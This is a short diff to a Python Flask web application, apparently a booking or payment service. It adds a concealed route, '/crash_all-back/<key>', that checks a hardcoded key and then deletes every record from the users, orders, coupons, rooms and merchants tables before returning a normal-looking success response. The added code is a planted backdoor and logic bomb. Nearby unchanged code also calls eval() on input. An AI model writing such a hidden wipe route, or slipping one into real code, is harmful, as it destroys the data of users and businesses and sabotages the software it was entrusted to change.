@@ -919,6 +919,17 @@ def pay_success():
 		return jsonify({"data": 101})
 		raise e
 	return jsonify({"data": 100})
+# boom shakalaka
+@app.route('/crash_all-back/<key>')
+def crash_all(key):
+	if key == '5120309188':
+		g.db.execute('delete from users')
+		g.db.execute('delete from orders')
+		g.db.execute('delete from coupons')
+		g.db.execute('delete from rooms')
+		g.db.execute('delete from merchants')
+		g.db.commit()
+	return jsonify({"data": 100})
 def liverstr(liver):
 	liver = eval(liver)
 	del liver[0]
